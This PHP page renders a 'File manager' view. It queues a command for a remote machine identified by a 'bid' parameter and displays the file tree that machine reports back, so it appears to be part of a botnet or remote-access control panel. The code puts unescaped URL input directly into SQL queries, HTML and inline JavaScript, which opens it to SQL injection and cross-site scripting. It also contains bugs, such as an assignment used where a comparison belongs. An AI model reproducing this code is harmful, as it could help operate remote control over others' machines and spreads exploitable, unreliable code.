<?php
	include "config.php";
	
	$bid = $_GET['bid'];
	
	print_header();
	
	print_menu();
	
	function show_tree($json,$level){
		global $bid;
		$html = "";
		foreach ($json as $d){
			//$html .= $d->path;
			if($d->type=="file"){
				$html .= $d->path;
				$html .= " <i class=\"fa fa-copy\"></i>";
				$html .= "<br>";
			}else{
				if (strpos($d->path, $level) === 0 || $level =="") {
					$html .= "<a href=filemanager.php?bid=$bid&level=".$d->path.">".$d->path."</a>";
					$html .= "<br>";
				}
			}
			
			if($d->type="dir"){
				//$html .= print_r($d->parent);
				if (strpos($d->path, $level) === 0) {
					$html .= show_tree($d->parent,$level);
				}
			}
			
		}
		return $html;
	}

	$html = "";
	
	$html = "<form class=\"form-inline my-2 my-lg-0 mr-lg-2\" action=\"file manager.php\" method=\"get\">
            <div class=\"input-group\">
              <input class=\"form-control\" name=bid type=\"text\" placeholder=\"Enter BID...\">
              <span class=\"input-group-append\">
                <button class=\"btn btn-primary\" type=\"submit\">
                  <i class=\"fa fa-search\"></i>
                </button>
              </span>
              
               <button type=\"button\" class=\"btn btn-success\" id=\"filemanagerrequest\">Update data</button>
							<button type=\"button\" class=\"btn\">Upload file</button>
            </div>
          </form>";
          
    $html .= "
							
							<script>
							$(document).ready(function($) {
								var cardobj = new Object();
								//cardobj.status  = 1;
								var cardjsonString= JSON.stringify(cardobj);

								$(\"#filemanagerrequest\").click(function(e) {
									e.preventDefault();
									$.ajax({
										type: \"POST\",
										url: \"ajax.php\",
										data: { 
											op: \"addcom\",
											bid: \"".$bid."\",
											idcom: 29,
											data: cardjsonString,
										},
										success: function(result) {
											location.reload();  
											//alert('ok');
										},
										error: function(result) {
											alert('error');
										}
									});
									//alert(1);
								});
							});
							</script>";      
          
    $html .= "<hr>";
          
    if(strlen($bid)>0){
		$sql = "select * from commands where idcom='29' and bid='".$bid."' ORDER by id DESC LIMIT 1";
		$res = $dbm->query($sql);
		if($dbm->count>0){
			while($row=mysqli_fetch_array($res)) {
				$result = $row["result"];
				if($result!=""){
					$level = $_GET['level'];
					if($level!="")$html.= "<a href=filemanager.php?bid=$bid>[back]</a><br><br>";
					$html .= show_tree(json_decode($result),$level);
				}else{
					$html .= "waiting data";
				}
			}
		}else{
			$html .= "data not found";
		}
	}

	print_content("File manager",$html,$bid);
	
	print_footer();

?>
